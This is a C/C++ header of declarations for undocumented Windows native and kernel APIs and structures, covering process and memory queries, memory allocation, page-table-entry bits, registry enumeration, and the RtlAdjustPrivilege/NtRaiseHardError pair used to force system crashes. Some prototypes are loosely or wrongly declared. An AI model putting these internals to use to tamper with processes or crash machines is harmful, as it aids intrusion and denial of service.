typedef struct _KEY_NAME_INFORMATION {
  ULONG NameLength;
  WCHAR Name[1];
} KEY_NAME_INFORMATION, *PKEY_NAME_INFORMATION;

typedef struct _KEY_BASIC_INFORMATION {
  LARGE_INTEGER LastWriteTime;
  ULONG         TitleIndex;
  ULONG         NameLength;
  WCHAR         Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef struct _KEY_VALUE_BASIC_INFORMATION {
  ULONG TitleIndex;
  ULONG Type;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
  ULONG TitleIndex;
  ULONG Type;
  ULONG DataOffset;
  ULONG DataLength;
  ULONG NameLength;
  WCHAR Name[1];
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

extern "C" NTSTATUS ZwQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

NTSTATUS PsLookupProcessByProcessId(
     [in] HANDLE ProcessId,
     [out] PEPROCESS *Process
);

NTSTATUS ObOpenObjectByPointer(
  [in]           PVOID           Object,
  [in]           ULONG           HandleAttributes,
  [in, optional] PACCESS_STATE   PassedAccessState,
  [in]           ACCESS_MASK     DesiredAccess,
  [in, optional] POBJECT_TYPE    ObjectType,
  [in]           KPROCESSOR_MODE AccessMode,
  [out]          PHANDLE         Handle
);

NTSYSAPI NTSTATUS NTAPI LdrGetProcedureAddress(



  IN HMODULE              ModuleHandle,
  IN PANSI_STRING         FunctionName OPTIONAL,
  IN WORD                 Oridinal OPTIONAL,
  OUT PVOID               *FunctionAddress );

void ObDereferenceObject(
  [in] int a
);

typedef struct _HARDWARE_PTE {
    ULONG Valid : 1;
    ULONG Write : 1;
    ULONG Owner : 1;
    ULONG WriteThrough : 1;
    ULONG CacheDisable : 1;
    ULONG Accessed : 1;
    ULONG Dirty : 1;
    ULONG LargePage : 1;
    ULONG Global : 1;
    ULONG CopyOnWrite : 1;
    ULONG Prototype : 1;
    ULONG reserved0 : 1;
    ULONG PageFrameNumber : 20;
} HARDWARE_PTE, *PHARDWARE_PTE;

static const ULONG MmProtectToPteMask[32] = {
    0x00000000, // PAGE_NOACCESS
    0x00000004, // PAGE_READONLY
    0x00000002, // PAGE_READWRITE
    0x00000002, // PAGE_WRITECOPY
    0x00000020, // PAGE_EXECUTE
    0x00000024, // PAGE_EXECUTE_READ
    0x00000022, // PAGE_EXECUTE_READWRITE
    0x00000022, // PAGE_EXECUTE_WRITECOPY
};

typedef enum _MEMORY_INFORMATION_CLASS {
  MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;

/*
typedef enum _MEMORY_INFORMATION_CLASS
{
    MemoryBasicInformation, // q: MEMORY_BASIC_INFORMATION
    MemoryWorkingSetInformation, // q: MEMORY_WORKING_SET_INFORMATION
    MemoryMappedFilenameInformation, // q: UNICODE_STRING
    MemoryRegionInformation, // q: MEMORY_REGION_INFORMATION
    MemoryWorkingSetExInformation, // q: MEMORY_WORKING_SET_EX_INFORMATION // since VISTA
    MemorySharedCommitInformation, // q: MEMORY_SHARED_COMMIT_INFORMATION // since WIN8
    MemoryImageInformation, // q: MEMORY_IMAGE_INFORMATION
    MemoryRegionInformationEx, // MEMORY_REGION_INFORMATION
    MemoryPrivilegedBasicInformation, // MEMORY_BASIC_INFORMATION
    MemoryEnclaveImageInformation, // MEMORY_ENCLAVE_IMAGE_INFORMATION // since REDSTONE3
    MemoryBasicInformationCapped, // 10
    MemoryPhysicalContiguityInformation, // MEMORY_PHYSICAL_CONTIGUITY_INFORMATION // since 20H1
    MemoryBadInformation, // since WIN11
    MemoryBadInformationAllProcesses, // since 22H1
    MemoryImageExtensionInformation, // MEMORY_IMAGE_EXTENSION_INFORMATION // since 24H2
    MaxMemoryInfoClass
} MEMORY_INFORMATION_CLASS;
*/

NTSYSAPI NTSTATUS ZwQueryVirtualMemory(
  [in]            HANDLE                   ProcessHandle,
  [in, optional]  PVOID                    BaseAddress,
  [in]            MEMORY_INFORMATION_CLASS MemoryInformationClass,
  [out]           PVOID                    MemoryInformation,
  [in]            SIZE_T                   MemoryInformationLength,
  [out, optional] PSIZE_T                  ReturnLength
);

NTSYSAPI NTSTATUS ZwAllocateVirtualMemory(
  [in]      HANDLE    ProcessHandle,
  [in, out] PVOID     *BaseAddress,
  [in]      ULONG_PTR ZeroBits,
  [in, out] PSIZE_T   RegionSize,
  [in]      ULONG     AllocationType,
  [in]      ULONG     Protect
);

NTSYSAPI NTSTATUS ZwEnumerateValueKey(
  [in]            HANDLE                      KeyHandle,
  [in]            ULONG                       Index,
  [in]            KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
  [out, optional] PVOID                       KeyValueInformation,
  [in]            ULONG                       Length,
  [out]           PULONG                      ResultLength
);

NTSYSAPI NTSTATUS ZwEnumerateKey(
  [in]            HANDLE                KeyHandle,
  [in]            ULONG                 Index,
  [in]            KEY_INFORMATION_CLASS KeyInformationClass,
  [out, optional] PVOID                 KeyInformation,
  [in]            ULONG                 Length,
  [out]           PULONG                ResultLength
);

#define NtCurrentProcess()        ((HANDLE)(LONG_PTR)-1)
#define ZwCurrentProcess()        NtCurrentProcess()
#define NtCurrentThread()         ((HANDLE)(LONG_PTR)-2)
#define ZwCurrentThread()         NtCurrentThread()

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);